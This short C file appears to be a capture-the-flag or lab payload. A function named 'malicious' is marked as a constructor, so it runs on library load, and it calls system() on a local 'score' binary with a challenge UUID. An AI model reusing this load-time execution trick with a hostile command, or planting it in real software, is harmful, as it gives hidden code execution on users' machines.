#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 02868ac9-1354-40a7-ac11-e30ab5410c3a");
}
